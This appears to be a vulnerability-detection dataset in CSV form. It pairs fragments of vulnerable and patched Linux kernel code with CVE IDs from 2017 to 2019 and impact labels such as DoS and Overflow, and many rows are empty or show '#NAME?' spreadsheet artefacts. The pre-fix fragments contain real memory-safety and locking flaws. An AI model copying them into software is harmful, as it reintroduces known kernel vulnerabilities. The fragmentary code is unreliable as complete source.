	C(INVALID_FILTER,	""Meaningless filter expression""),	\
	C(IP_FIELD_ONLY,	""Only 'ip' field is supported for function trace""), \
	C(INVALID_VALUE,	""Invalid value (did you forget quotes)?""), \
	C(NO_FILTER,		""No filter found""),

#undef C
#define C(a, b)		FILT_ERR_##a
 goto out_free;
	}

 if (!N) {
 /* No program? */
		ret = -EINVAL;
 parse_error(pe, FILT_ERR_NO_FILTER, ptr - str);
 goto out_free;
	}

	prog[N].pred = NULL;					/* #13 */
	prog[N].target = 1;		/* TRUE */
	prog[N+1].pred = NULL;
	     ""$(CC_FLAGS_FTRACE)"" ]; then			\
		$(sub_cmd_record_mcount)			\
	fi;
endif # -record-mcount
endif # CONFIG_FTRACE_MCOUNT_RECORD

ifdef CONFIG_STACK_VALIDATION
  objtool_args += --retpoline
endif
endif



ifdef CONFIG_MODVERSIONS
"
2018,DoS +Info ,CVE-2018-12633," if (!buf)
 return -ENOMEM;

 if (copy_from_user(buf, (void *)arg, hdr.size_in)) {


		ret = -EFAULT;
 goto out;
	}
"," if (!buf)
 return -ENOMEM;

	*((struct vbg_ioctl_hdr *)buf) = hdr;
 if (copy_from_user(buf + sizeof(hdr), (void *)arg + sizeof(hdr),
			   hdr.size_in - sizeof(hdr))) {
		ret = -EFAULT;
 goto out;
	}
"
2018,Overflow Mem. Corr. ,CVE-2018-12233,,
2018,,CVE-2018-12232," if (!err && (iattr->ia_valid & ATTR_UID)) {
 struct socket *sock = SOCKET_I(d_inode(dentry));

		sock->sk->sk_uid = iattr->ia_uid;



	}

 return err;
 *	an inode not a file.
 */

void sock_release(struct socket *sock)
{
 if (sock->ops) {
 struct module *owner = sock->ops->owner;



		sock->ops->release(sock);


		sock->ops = NULL;
 module_put(owner);
	}
	}
	sock->file = NULL;
}





EXPORT_SYMBOL(sock_release);

void __sock_tx_timestamp(__u16 tsflags, __u8 *tx_flags)

static int sock_close(struct inode *inode, struct file *filp)
{
 sock_release(SOCKET_I(inode));
 return 0;
}

"," if (!err && (iattr->ia_valid & ATTR_UID)) {
 struct socket *sock = SOCKET_I(d_inode(dentry));

 if (sock->sk)
			sock->sk->sk_uid = iattr->ia_uid;
 else
			err = -ENOENT;
	}

 return err;
 *	an inode not a file.
 */

static void __sock_release(struct socket *sock, struct inode *inode)
{
 if (sock->ops) {
 struct module *owner = sock->ops->owner;

 if (inode)
 inode_lock(inode);
		sock->ops->release(sock);
 if (inode)
 inode_unlock(inode);
		sock->ops = NULL;
 module_put(owner);
	}
	}
	sock->file = NULL;
}

void sock_release(struct socket *sock)
{
 __sock_release(sock, NULL);
}
EXPORT_SYMBOL(sock_release);

void __sock_tx_timestamp(__u16 tsflags, __u8 *tx_flags)

static int sock_close(struct inode *inode, struct file *filp)
{
 __sock_release(SOCKET_I(inode), inode);
 return 0;
}

"
2018,#NAME?,CVE-2018-11508,"{
 struct compat_timex tx32;


 if (copy_from_user(&tx32, utp, sizeof(struct compat_timex)))
 return -EFAULT;

","{
 struct compat_timex tx32;

 memset(txc, 0, sizeof(struct timex));
 if (copy_from_user(&tx32, utp, sizeof(struct compat_timex)))
 return -EFAULT;

"
2018,DoS Overflow ,CVE-2018-11506," struct scsi_device *SDev;
 struct scsi_sense_hdr sshdr;
 int result, err = 0, retries = 0;


	SDev = cd->device;




      retry:
 if (!scsi_block_when_processing_errors(SDev)) {
		err = -ENODEV;
 goto out;
	}

	result = scsi_execute(SDev, cgc->cmd, cgc->data_direction,
			      cgc->buffer, cgc->buflen,
			      (unsigned char *)cgc->sense, &sshdr,
			      cgc->timeout, IOCTL_RETRIES, 0, 0, NULL);




 /* Minimal error checking.  Ignore cases we know about, and report the rest. */
 if (driver_byte(result) != 0) {
 switch (sshdr.sense_key) {
"," struct scsi_device *SDev;
 struct scsi_sense_hdr sshdr;
 int result, err = 0, retries = 0;
 unsigned char sense_buffer[SCSI_SENSE_BUFFERSIZE], *senseptr = NULL;

	SDev = cd->device;

 if (cgc->sense)
		senseptr = sense_buffer;

      retry:
 if (!scsi_block_when_processing_errors(SDev)) {
		err = -ENODEV;
 goto out;
	}

	result = scsi_execute(SDev, cgc->cmd, cgc->data_direction,
			      cgc->buffer, cgc->buflen, senseptr, &sshdr,

			      cgc->timeout, IOCTL_RETRIES, 0, 0, NULL);

 if (cgc->sense)
 memcpy(cgc->sense, sense_buffer, sizeof(*cgc->sense));

 /* Minimal error checking.  Ignore cases we know about, and report the rest. */
 if (driver_byte(result) != 0) {
 switch (sshdr.sense_key) {
"
2018,,CVE-2018-11412,,
2018,DoS ,CVE-2018-11232," if (!sink_ops(sink)->alloc_buffer)
 goto err;


 /* Get the AUX specific data from the sink buffer */
	event_data->snk_config =
 sink_ops(sink)->alloc_buffer(sink, cpu, pages,
"," if (!sink_ops(sink)->alloc_buffer)
 goto err;

	cpu = cpumask_first(mask);
 /* Get the AUX specific data from the sink buffer */
	event_data->snk_config =
 sink_ops(sink)->alloc_buffer(sink, cpu, pages,
"
2018,Overflow ,CVE-2018-10940," if (!CDROM_CAN(CDC_SELECT_DISC) || arg == CDSL_CURRENT)
 return media_changed(cdi, 1);

 if ((unsigned int)arg >= cdi->capacity)
 return -EINVAL;

	info = kmalloc(sizeof(*info), GFP_KERNEL);
"," if (!CDROM_CAN(CDC_SELECT_DISC) || arg == CDSL_CURRENT)
 return media_changed(cdi, 1);

 if (arg >= cdi->capacity)
 return -EINVAL;

	info = kmalloc(sizeof(*info), GFP_KERNEL);
"
2018,,CVE-2018-10938,,
2018,#NAME?,CVE-2018-10902,,
2018,,CVE-2018-10901,,
2018,DoS ,CVE-2018-10883,,
2018,DoS ,CVE-2018-10882,,
2018,DoS Overflow ,CVE-2018-10881,,
2018,DoS ,CVE-2018-10880,,
2018,DoS ,CVE-2018-10879,,
2018,DoS ,CVE-2018-10878,,
2018,,CVE-2018-10877,,
2018,,CVE-2018-10876,,
2018,,CVE-2018-10853,,
2018,Overflow ,CVE-2018-10840,,
2018,DoS ,CVE-2018-10675,"		*policy |= (pol->flags & MPOL_MODE_FLAGS);
	}

 if (vma) {
 up_read(&current->mm->mmap_sem);
		vma = NULL;
	}

	err = 0;
 if (nmask) {
 if (mpol_store_user_nodemask(pol)) {
","		*policy |= (pol->flags & MPOL_MODE_FLAGS);
	}






	err = 0;
 if (nmask) {
 if (mpol_store_user_nodemask(pol)) {
"
2018,DoS ,CVE-2018-10323,,
2018,DoS ,CVE-2018-10322,,
2018,DoS Overflow ,CVE-2018-10124," return ret;
	}





 read_lock(&tasklist_lock);
 if (pid != -1) {
		ret = __kill_pgrp_info(sig, info,
"," return ret;
	}

 /* -INT_MIN is undefined.  Exclude this case to avoid a UBSAN warning */
 if (pid == INT_MIN)
 return -ESRCH;

 read_lock(&tasklist_lock);
 if (pid != -1) {
		ret = __kill_pgrp_info(sig, info,
"
2018,DoS ,CVE-2018-10087,"			__WNOTHREAD|__WCLONE|__WALL))
 return -EINVAL;





 if (upid == -1)
		type = PIDTYPE_MAX;
 else if (upid < 0) {
","			__WNOTHREAD|__WCLONE|__WALL))
 return -EINVAL;

 /* -INT_MIN is not defined */
 if (upid == INT_MIN)
 return -ESRCH;

 if (upid == -1)
		type = PIDTYPE_MAX;
 else if (upid < 0) {
"
2018,DoS ,CVE-2018-10074," return PTR_ERR(stub_clk_chan.mbox);

	res = platform_get_resource(pdev, IORESOURCE_MEM, 0);


	freq_reg = devm_ioremap(dev, res->start, resource_size(res));
 if (!freq_reg)
 return -ENOMEM;
"," return PTR_ERR(stub_clk_chan.mbox);

	res = platform_get_resource(pdev, IORESOURCE_MEM, 0);
 if (!res)
 return -EINVAL;
	freq_reg = devm_ioremap(dev, res->start, resource_size(res));
 if (!freq_reg)
 return -ENOMEM;
"
2018,DoS ,CVE-2018-10021,"static void sas_eh_finish_cmd(struct scsi_cmnd *cmd)
{
 struct sas_ha_struct *sas_ha = SHOST_TO_SAS_HA(cmd->device->host);

 struct sas_task *task = TO_SAS_TASK(cmd);

 /* At this point, we only get called following an actual abort
 */
 sas_end_task(cmd, task);









 /* now finish the command and move it on to the error
	 * handler done list, this also takes it off the
	 * error handler pending list.
 */
 scsi_eh_finish_cmd(cmd, &sas_ha->eh_done_q);
}

static void sas_eh_defer_cmd(struct scsi_cmnd *cmd)
{
 struct domain_device *dev = cmd_to_domain_dev(cmd);
 struct sas_ha_struct *ha = dev->port->ha;
 struct sas_task *task = TO_SAS_TASK(cmd);

 if (!dev_is_sata(dev)) {
 sas_eh_finish_cmd(cmd);
 return;
	}

 /* report the timeout to libata */
 sas_end_task(cmd, task);
 list_move_tail(&cmd->eh_entry, &ha->eh_ata_q);
}

static void sas_scsi_clear_queue_lu(struct list_head *error_q, struct scsi_cmnd *my_cmd)
{
 struct scsi_cmnd *cmd, *n;

 list_for_each_entry_safe(cmd, n, error_q, eh_entry) {
 if (cmd->device->sdev_target == my_cmd->device->sdev_target &&
		    cmd->device->lun == my_cmd->device->lun)
 sas_eh_defer_cmd(cmd);
	}
}

 case TASK_IS_DONE:
 SAS_DPRINTK(""%s: task 0x%p is done\n"", __func__,
				    task);
 sas_eh_defer_cmd(cmd);
 continue;
 case TASK_IS_ABORTED:
 SAS_DPRINTK(""%s: task 0x%p is aborted\n"",
				    __func__, task);
 sas_eh_defer_cmd(cmd);
 continue;
 case TASK_IS_AT_LU:
 SAS_DPRINTK(""task 0x%p is at LU: lu recover\n"", task);
 ""recovered\n"",
 SAS_ADDR(task->dev),
					    cmd->device->lun);
 sas_eh_defer_cmd(cmd);
 sas_scsi_clear_queue_lu(work_q, cmd);
 goto Again;
			}
","static void sas_eh_finish_cmd(struct scsi_cmnd *cmd)
{
 struct sas_ha_struct *sas_ha = SHOST_TO_SAS_HA(cmd->device->host);
 struct domain_device *dev = cmd_to_domain_dev(cmd);
 struct sas_task *task = TO_SAS_TASK(cmd);

 /* At this point, we only get called following an actual abort
 */
 sas_end_task(cmd, task);

 if (dev_is_sata(dev)) {
 /* defer commands to libata so that libata EH can
		 * handle ata qcs correctly
 */
 list_move_tail(&cmd->eh_entry, &sas_ha->eh_ata_q);
 return;
	}

 /* now finish the command and move it on to the error
	 * handler done list, this also takes it off the
	 * error handler pending list.
 */
 scsi_eh_finish_cmd(cmd, &sas_ha->eh_done_q);
}

















static void sas_scsi_clear_queue_lu(struct list_head *error_q, struct scsi_cmnd *my_cmd)
{
 struct scsi_cmnd *cmd, *n;

 list_for_each_entry_safe(cmd, n, error_q, eh_entry) {
 if (cmd->device->sdev_target == my_cmd->device->sdev_target &&
		    cmd->device->lun == my_cmd->device->lun)
 sas_eh_finish_cmd(cmd);
	}
}

 case TASK_IS_DONE:
 SAS_DPRINTK(""%s: task 0x%p is done\n"", __func__,
				    task);
 sas_eh_finish_cmd(cmd);
 continue;
 case TASK_IS_ABORTED:
 SAS_DPRINTK(""%s: task 0x%p is aborted\n"",
				    __func__, task);
 sas_eh_finish_cmd(cmd);
 continue;
 case TASK_IS_AT_LU:
 SAS_DPRINTK(""task 0x%p is at LU: lu recover\n"", task);
 ""recovered\n"",
 SAS_ADDR(task->dev),
					    cmd->device->lun);
 sas_eh_finish_cmd(cmd);
 sas_scsi_clear_queue_lu(work_q, cmd);
 goto Again;
			}
"
2018,Exec Code Overflow ,CVE-2018-8822,,
2018,Exec Code Overflow ,CVE-2018-8781,,
2018,DoS ,CVE-2018-8087," if (info->attrs[HWSIM_ATTR_REG_CUSTOM_REG]) {
		u32 idx = nla_get_u32(info->attrs[HWSIM_ATTR_REG_CUSTOM_REG]);

 if (idx >= ARRAY_SIZE(hwsim_world_regdom_custom))

 return -EINVAL;

		param.regd = hwsim_world_regdom_custom[idx];
	}

"," if (info->attrs[HWSIM_ATTR_REG_CUSTOM_REG]) {
		u32 idx = nla_get_u32(info->attrs[HWSIM_ATTR_REG_CUSTOM_REG]);

 if (idx >= ARRAY_SIZE(hwsim_world_regdom_custom)) {
 kfree(hwname);
 return -EINVAL;
		}
		param.regd = hwsim_world_regdom_custom[idx];
	}

"
2018,DoS ,CVE-2018-8043," return -ENOMEM;

	r = platform_get_resource(pdev, IORESOURCE_MEM, 0);



 /* Just ioremap, as this MDIO block is usually integrated into an
	 * Ethernet MAC controller register range
"," return -ENOMEM;

	r = platform_get_resource(pdev, IORESOURCE_MEM, 0);
 if (!r)
 return -EINVAL;

 /* Just ioremap, as this MDIO block is usually integrated into an
	 * Ethernet MAC controller register range
"
2018,DoS ,CVE-2018-7995,,
2018,DoS ,CVE-2018-7757,"	phy->phy_reset_problem_count = scsi_to_u32(&resp[24]);

 out:

 kfree(resp);
 return res;

","	phy->phy_reset_problem_count = scsi_to_u32(&resp[24]);

 out:
 kfree(req);
 kfree(resp);
 return res;

"
2018,Bypass +Info ,CVE-2018-7755,,
2018,#NAME?,CVE-2018-7754,,
2018,DoS Overflow ,CVE-2018-7740,,
2018,Overflow ,CVE-2018-7566,,
2018,,CVE-2018-7492," long i;
 int ret;

 if (rs->rs_bound_addr == 0) {
		ret = -ENOTCONN; /* XXX not a great errno */
 goto out;
	}
"," long i;
 int ret;

 if (rs->rs_bound_addr == 0 || !rs->rs_transport) {
		ret = -ENOTCONN; /* XXX not a great errno */
 goto out;
	}
"
2018,DoS ,CVE-2018-7480," if (preloaded)
 radix_tree_preload_end();

 if (IS_ERR(blkg)) {
 blkg_free(new_blkg);
 return PTR_ERR(blkg);
	}

	q->root_blkg = blkg;
	q->root_rl.blkg = blkg;
"," if (preloaded)
 radix_tree_preload_end();

 if (IS_ERR(blkg))

 return PTR_ERR(blkg);


	q->root_blkg = blkg;
	q->root_rl.blkg = blkg;
"
2018,Bypass +Info ,CVE-2018-7273,,
2019,DoS ,CVE-2018-7191," if (!dev)
 return -ENOMEM;
		err = dev_get_valid_name(net, dev, name);
 if (err)
 goto err_free_dev;

 dev_net_set(dev, net);
"," if (!dev)
 return -ENOMEM;
		err = dev_get_valid_name(net, dev, name);
 if (err < 0)
 goto err_free_dev;

 dev_net_set(dev, net);
"
2018,DoS Overflow ,CVE-2018-6927," struct futex_q *this, *next;
 DEFINE_WAKE_Q(wake_q);




 /*
	 * When PI not supported: return -ENOSYS if requeue_pi is true,
	 * consequently the compiler knows requeue_pi is always false past
"," struct futex_q *this, *next;
 DEFINE_WAKE_Q(wake_q);

 if (nr_wake < 0 || nr_requeue < 0)
 return -EINVAL;

 /*
	 * When PI not supported: return -ENOSYS if requeue_pi is true,
	 * consequently the compiler knows requeue_pi is always false past
"
2018,#NAME?,CVE-2018-6559,,
2018,DoS ,CVE-2018-6555,,
2018,DoS ,CVE-2018-6554,,
2018,#NAME?,CVE-2018-6412," unsigned char __user *ured;
 unsigned char __user *ugreen;
 unsigned char __user *ublue;
 int index, count, i;

 if (get_user(index, &c->index) ||
 __get_user(count, &c->count) ||
 unsigned char __user *ugreen;
 unsigned char __user *ublue;
 struct fb_cmap *cmap = &info->cmap;
 int index, count, i;
		u8 red, green, blue;

 if (get_user(index, &c->index) ||
"," unsigned char __user *ured;
 unsigned char __user *ugreen;
 unsigned char __user *ublue;
 unsigned int index, count, i;

 if (get_user(index, &c->index) ||
 __get_user(count, &c->count) ||
 unsigned char __user *ugreen;
 unsigned char __user *ublue;
 struct fb_cmap *cmap = &info->cmap;
 unsigned int index, count, i;
		u8 red, green, blue;

 if (get_user(index, &c->index) ||
"
2018,#NAME?,CVE-2018-5995,,
2018,#NAME?,CVE-2018-5953,,
2018,,CVE-2018-5873," return ERR_PTR(-ENOMEM);
	}
 d_instantiate(dentry, inode);

	dentry->d_fsdata = (void *)ns->ops;
	d = atomic_long_cmpxchg(&ns->stashed, 0, (unsigned long)dentry);
 if (d) {
"," return ERR_PTR(-ENOMEM);
	}
 d_instantiate(dentry, inode);
	dentry->d_flags |= DCACHE_RCUACCESS;
	dentry->d_fsdata = (void *)ns->ops;
	d = atomic_long_cmpxchg(&ns->stashed, 0, (unsigned long)dentry);
 if (d) {
"
2018,,CVE-2018-5814,,
2018,,CVE-2018-5803,,
2018,#NAME?,CVE-2018-5750,,
2018,DoS ,CVE-2018-5703,,
2018,DoS ,CVE-2018-5391,,
2018,DoS ,CVE-2018-5390,,
2018,DoS ,CVE-2018-5344," return err;
}

static void lo_release(struct gendisk *disk, fmode_t mode)
{
 struct loop_device *lo = disk->private_data;
 int err;

 if (atomic_dec_return(&lo->lo_refcnt))
 mutex_unlock(&lo->lo_ctl_mutex);
}








static const struct block_device_operations lo_fops = {
	.owner =	THIS_MODULE,
	.open =		lo_open,
"," return err;
}

static void __lo_release(struct loop_device *lo)
{

 int err;

 if (atomic_dec_return(&lo->lo_refcnt))
 mutex_unlock(&lo->lo_ctl_mutex);
}

static void lo_release(struct gendisk *disk, fmode_t mode)
{
 mutex_lock(&loop_index_mutex);
 __lo_release(disk->private_data);
 mutex_unlock(&loop_index_mutex);
}

static const struct block_device_operations lo_fops = {
	.owner =	THIS_MODULE,
	.open =		lo_open,
"
2018,,CVE-2018-5333,"err:
 if (page)
 put_page(page);

 kfree(rm->atomic.op_notifier);

 return ret;
","err:
 if (page)
 put_page(page);
	rm->atomic.op_active = 0;
 kfree(rm->atomic.op_notifier);

 return ret;
"
2018,,CVE-2018-5332,"
	local_vec = (struct rds_iovec __user *)(unsigned long) args->local_vec_addr;




 /* figure out the number of pages in the vector */
 for (i = 0; i < args->nr_local; i++) {
 if (copy_from_user(&vec, &local_vec[i],
","
	local_vec = (struct rds_iovec __user *)(unsigned long) args->local_vec_addr;

 if (args->nr_local == 0)
 return -EINVAL;

 /* figure out the number of pages in the vector */
 for (i = 0; i < args->nr_local; i++) {
 if (copy_from_user(&vec, &local_vec[i],
"
2018,DoS ,CVE-2018-1130,,
2018,DoS Overflow ,CVE-2018-1120,,
2018,#NAME?,CVE-2018-1118,,
2018,,CVE-2018-1108,,
2018,DoS ,CVE-2018-1095,,
2018,DoS ,CVE-2018-1094,,
2018,DoS ,CVE-2018-1093,,
2018,DoS ,CVE-2018-1092,,
2018,DoS Overflow ,CVE-2018-1091,"	 * in the appropriate thread structures from live.
 */

 if (tsk != current)
 return;

 if (MSR_TM_SUSPENDED(mfmsr())) {
","	 * in the appropriate thread structures from live.
 */

 if ((!cpu_has_feature(CPU_FTR_TM)) || (tsk != current))
 return;

 if (MSR_TM_SUSPENDED(mfmsr())) {
"
2018,,CVE-2018-1087,,
2018,,CVE-2018-1068," if (match_kern)
			match_kern->match_size = ret;

 WARN_ON(type == EBT_COMPAT_TARGET && size_left);


		match32 = (struct compat_ebt_entry_mwt *) buf;
	}

	 *
	 * offsets are relative to beginning of struct ebt_entry (i.e., 0).
 */









 for (i = 0, j = 1 ; j < 4 ; j++, i++) {
 struct compat_ebt_entry_mwt *match32;
 unsigned int size;
"," if (match_kern)
			match_kern->match_size = ret;

 if (WARN_ON(type == EBT_COMPAT_TARGET && size_left))
 return -EINVAL;

		match32 = (struct compat_ebt_entry_mwt *) buf;
	}

	 *
	 * offsets are relative to beginning of struct ebt_entry (i.e., 0).
 */
 for (i = 0; i < 4 ; ++i) {
 if (offsets[i] >= *total)
 return -EINVAL;
 if (i == 0)
 continue;
 if (offsets[i-1] > offsets[i])
 return -EINVAL;
	}

 for (i = 0, j = 1 ; j < 4 ; j++, i++) {
 struct compat_ebt_entry_mwt *match32;
 unsigned int size;
"
2018,,CVE-2018-1066," /* BB is NTLMV2 session security format easier to use here? */
	flags = NTLMSSP_NEGOTIATE_56 |	NTLMSSP_REQUEST_TARGET |
		NTLMSSP_NEGOTIATE_128 | NTLMSSP_NEGOTIATE_UNICODE |
		NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_NEGOTIATE_EXTENDED_SEC;
 if (ses->server->sign) {

		flags |= NTLMSSP_NEGOTIATE_SIGN;
 if (!ses->server->session_estab ||
				ses->ntlmssp->sesskey_per_smbsess)
			flags |= NTLMSSP_NEGOTIATE_KEY_XCH;
	}

	sec_blob->NegotiateFlags = cpu_to_le32(flags);

	flags = NTLMSSP_NEGOTIATE_56 |
		NTLMSSP_REQUEST_TARGET | NTLMSSP_NEGOTIATE_TARGET_INFO |
		NTLMSSP_NEGOTIATE_128 | NTLMSSP_NEGOTIATE_UNICODE |
		NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_NEGOTIATE_EXTENDED_SEC;
 if (ses->server->sign) {

		flags |= NTLMSSP_NEGOTIATE_SIGN;
 if (!ses->server->session_estab ||
				ses->ntlmssp->sesskey_per_smbsess)
			flags |= NTLMSSP_NEGOTIATE_KEY_XCH;
	}

	tmp = *pbuffer + sizeof(AUTHENTICATE_MESSAGE);
	sec_blob->NegotiateFlags = cpu_to_le32(flags);
 struct cifs_ses *ses = sess_data->ses;

 mutex_lock(&ses->server->srv_mutex);
 if (ses->server->sign && ses->server->ops->generate_signingkey) {
		rc = ses->server->ops->generate_signingkey(ses);
 kfree(ses->auth_key.response);
		ses->auth_key.response = NULL;
 if (rc) {
 cifs_dbg(FYI,
 ""SMB3 session key generation failed\n"");
 mutex_unlock(&ses->server->srv_mutex);
 goto keygen_exit;
		}
	}
 if (!ses->server->session_estab) {
	ses->status = CifsGood;
	ses->need_reconnect = false;
 spin_unlock(&GlobalMid_Lock);

keygen_exit:
 if (!ses->server->sign) {
 kfree(ses->auth_key.response);
		ses->auth_key.response = NULL;
	}
 return rc;
}

"," /* BB is NTLMV2 session security format easier to use here? */
	flags = NTLMSSP_NEGOTIATE_56 |	NTLMSSP_REQUEST_TARGET |
		NTLMSSP_NEGOTIATE_128 | NTLMSSP_NEGOTIATE_UNICODE |
		NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_NEGOTIATE_EXTENDED_SEC |
		NTLMSSP_NEGOTIATE_SEAL;
 if (ses->server->sign)
		flags |= NTLMSSP_NEGOTIATE_SIGN;
 if (!ses->server->session_estab || ses->ntlmssp->sesskey_per_smbsess)
		flags |= NTLMSSP_NEGOTIATE_KEY_XCH;



	sec_blob->NegotiateFlags = cpu_to_le32(flags);

	flags = NTLMSSP_NEGOTIATE_56 |
		NTLMSSP_REQUEST_TARGET | NTLMSSP_NEGOTIATE_TARGET_INFO |
		NTLMSSP_NEGOTIATE_128 | NTLMSSP_NEGOTIATE_UNICODE |
		NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_NEGOTIATE_EXTENDED_SEC |
		NTLMSSP_NEGOTIATE_SEAL;
 if (ses->server->sign)
		flags |= NTLMSSP_NEGOTIATE_SIGN;
 if (!ses->server->session_estab || ses->ntlmssp->sesskey_per_smbsess)
		flags |= NTLMSSP_NEGOTIATE_KEY_XCH;



	tmp = *pbuffer + sizeof(AUTHENTICATE_MESSAGE);
	sec_blob->NegotiateFlags = cpu_to_le32(flags);
 struct cifs_ses *ses = sess_data->ses;

 mutex_lock(&ses->server->srv_mutex);
 if (ses->server->ops->generate_signingkey) {
		rc = ses->server->ops->generate_signingkey(ses);


 if (rc) {
 cifs_dbg(FYI,
 ""SMB3 session key generation failed\n"");
 mutex_unlock(&ses->server->srv_mutex);
 return rc;
		}
	}
 if (!ses->server->session_estab) {
	ses->status = CifsGood;
	ses->need_reconnect = false;
 spin_unlock(&GlobalMid_Lock);






 return rc;
}

"
2018,DoS ,CVE-2018-1065,"			}
 if (table_base + v
			    != arpt_next_entry(e)) {




				jumpstack[stackidx++] = e;
			}

 continue;
			}
 if (table_base + v != ipt_next_entry(e) &&
			    !(e->ip.flags & IPT_F_GOTO))




				jumpstack[stackidx++] = e;


			e = get_entry(table_base, v);
 continue;
			}
 if (table_base + v != ip6t_next_entry(e) &&
			    !(e->ipv6.flags & IP6T_F_GOTO)) {




				jumpstack[stackidx++] = e;
			}

","			}
 if (table_base + v
			    != arpt_next_entry(e)) {
 if (unlikely(stackidx >= private->stacksize)) {
					verdict = NF_DROP;
 break;
				}
				jumpstack[stackidx++] = e;
			}

 continue;
			}
 if (table_base + v != ipt_next_entry(e) &&
			    !(e->ip.flags & IPT_F_GOTO)) {
 if (unlikely(stackidx >= private->stacksize)) {
					verdict = NF_DROP;
 break;
				}
				jumpstack[stackidx++] = e;
			}

			e = get_entry(table_base, v);
 continue;
			}
 if (table_base + v != ip6t_next_entry(e) &&
			    !(e->ipv6.flags & IP6T_F_GOTO)) {
 if (unlikely(stackidx >= private->stacksize)) {
					verdict = NF_DROP;
 break;
				}
				jumpstack[stackidx++] = e;
			}

"
2017,Bypass +Info ,CVE-2017-1000410,,
2017,DoS ,CVE-2017-1000407,,
2017,,CVE-2017-1000405,,
2017,#NAME?,CVE-2017-1000380,"
	tu = file->private_data;
	unit = tu->tread ? sizeof(struct snd_timer_tread) : sizeof(struct snd_timer_read);

 spin_lock_irq(&tu->qlock);
 while ((long)count - result >= unit) {
 while (!tu->qused) {
 add_wait_queue(&tu->qchange_sleep, &wait);

 spin_unlock_irq(&tu->qlock);

 schedule();

 spin_lock_irq(&tu->qlock);

 remove_wait_queue(&tu->qchange_sleep, &wait);
		tu->qused--;
 spin_unlock_irq(&tu->qlock);

 mutex_lock(&tu->ioctl_lock);
 if (tu->tread) {
 if (copy_to_user(buffer, &tu->tqueue[qhead],
 sizeof(struct snd_timer_tread)))
 sizeof(struct snd_timer_read)))
				err = -EFAULT;
		}
 mutex_unlock(&tu->ioctl_lock);

 spin_lock_irq(&tu->qlock);
 if (err < 0)
	}
 _error:
 spin_unlock_irq(&tu->qlock);

 return result > 0 ? result : err;
}

","
	tu = file->private_data;
	unit = tu->tread ? sizeof(struct snd_timer_tread) : sizeof(struct snd_timer_read);
 mutex_lock(&tu->ioctl_lock);
 spin_lock_irq(&tu->qlock);
 while ((long)count - result >= unit) {
 while (!tu->qused) {
 add_wait_queue(&tu->qchange_sleep, &wait);

 spin_unlock_irq(&tu->qlock);
 mutex_unlock(&tu->ioctl_lock);
 schedule();
 mutex_lock(&tu->ioctl_lock);
 spin_lock_irq(&tu->qlock);

 remove_wait_queue(&tu->qchange_sleep, &wait);
		tu->qused--;
 spin_unlock_irq(&tu->qlock);


 if (tu->tread) {
 if (copy_to_user(buffer, &tu->tqueue[qhead],
 sizeof(struct snd_timer_tread)))
 sizeof(struct snd_timer_read)))
				err = -EFAULT;
		}


 spin_lock_irq(&tu->qlock);
 if (err < 0)
	}
 _error:
 spin_unlock_irq(&tu->qlock);
 mutex_unlock(&tu->ioctl_lock);
 return result > 0 ? result : err;
}

"
2017,,CVE-2017-1000379,,
2017,Overflow Bypass ,CVE-2017-1000377,,
2017,,CVE-2017-1000371,,
2017,,CVE-2017-1000370,,
2017,Bypass ,CVE-2017-1000365,,
2017,Overflow Bypass ,CVE-2017-1000364,,
2017,Overflow ,CVE-2017-1000363,,
2017,DoS ,CVE-2017-1000252," struct kvm_lapic_irq irq;
 struct kvm_vcpu *vcpu;
 struct vcpu_data vcpu_info;
 int idx, ret = -EINVAL;

 if (!kvm_arch_has_assigned_device(kvm) ||
		!irq_remapping_cap(IRQ_POSTING_CAP) ||

	idx = srcu_read_lock(&kvm->irq_srcu);
	irq_rt = srcu_dereference(kvm->irq_routing, &kvm->irq_srcu);
 BUG_ON(guest_irq >= irq_rt->nr_rt_entries);






 hlist_for_each_entry(e, &irq_rt->map[guest_irq], link) {
 if (e->type != KVM_IRQ_ROUTING_MSI)
"," struct kvm_lapic_irq irq;
 struct kvm_vcpu *vcpu;
 struct vcpu_data vcpu_info;
 int idx, ret = 0;

 if (!kvm_arch_has_assigned_device(kvm) ||
		!irq_remapping_cap(IRQ_POSTING_CAP) ||

	idx = srcu_read_lock(&kvm->irq_srcu);
	irq_rt = srcu_dereference(kvm->irq_routing, &kvm->irq_srcu);
 if (guest_irq >= irq_rt->nr_rt_entries ||
 hlist_empty(&irq_rt->map[guest_irq])) {
 pr_warn_once(""no route for guest_irq %u/%u (broken user space?)\n"",
			     guest_irq, irq_rt->nr_rt_entries);
 goto out;
	}

 hlist_for_each_entry(e, &irq_rt->map[guest_irq], link) {
 if (e->type != KVM_IRQ_ROUTING_MSI)
"
2017,Exec Code Overflow ,CVE-2017-1000251,"
/* L2CAP defaults */
#define L2CAP_DEFAULT_MTU 672

#define L2CAP_DEFAULT_FLUSH_TO 0xffff
#define L2CAP_DEFAULT_RX_WINDOW 1
#define L2CAP_DEFAULT_MAX_RECEIVE 1
#define L2CAP_DEFAULT_RETRANS_TO 300 /* 300 milliseconds */
#define L2CAP_DEFAULT_MONITOR_TO 1000 /* 1 second */
	__u16		omtu;
	__u16		flush_to;
	__u8		mode;



	__u8		fcs;
	__u8		sec_level;
	__u8		role_switch;
	__u8		conf_req[64];
	__u8		conf_len;
	__u8		conf_state;
	__u8		conf_retry;

	__u8		ident;







	__le16		sport;

 struct l2cap_conn	*conn;
 struct sock		*next_c;
 struct sock		*prev_c;
};

#define L2CAP_CONF_REQ_SENT 0x01
#define L2CAP_CONF_INPUT_DONE 0x02
#define L2CAP_CONF_OUTPUT_DONE 0x04
#define L2CAP_CONF_CONNECT_PEND 0x80







#define L2CAP_CONF_MAX_RETRIES 2

void l2cap_load(void);

","
/* L2CAP defaults */
#define L2CAP_DEFAULT_MTU 672
#define L2CAP_DEFAULT_MIN_MTU 48
#define L2CAP_DEFAULT_FLUSH_TO 0xffff
#define L2CAP_DEFAULT_TX_WINDOW 1
#define L2CAP_DEFAULT_MAX_RECEIVE 1
#define L2CAP_DEFAULT_RETRANS_TO 300 /* 300 milliseconds */
#define L2CAP_DEFAULT_MONITOR_TO 1000 /* 1 second */
	__u16		omtu;
	__u16		flush_to;
	__u8		mode;
	__u8		num_conf_req;
	__u8		num_conf_rsp;

	__u8		fcs;
	__u8		sec_level;
	__u8		role_switch;
	__u8		conf_req[64];
	__u8		conf_len;
	__u8		conf_state;


	__u8		ident;

	__u8		remote_tx_win;
	__u8		remote_max_tx;
	__u16		retrans_timeout;
	__u16		monitor_timeout;
	__u16		max_pdu_size;

